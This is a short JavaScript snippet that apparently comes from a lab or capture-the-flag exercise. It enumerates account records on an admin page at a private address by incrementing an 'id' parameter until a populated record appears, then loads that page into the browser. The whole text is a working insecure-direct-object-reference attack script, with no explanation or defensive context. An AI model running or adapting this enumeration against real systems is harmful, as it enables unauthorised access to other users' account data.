(async function() {
  var i = 2;
  while (true) {
    let responseText = await fetch(`http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=${i}`).then(res => res.text());
    let doc = (new DOMParser).parseFromString(responseText, "text/html");
    if (doc.querySelector("table > tbody > tr:nth-child(2)").innerText.trim() !== "") {
      document.body = doc.body;
      console.log(i);
      break;
    }
    i++;
  }
})()
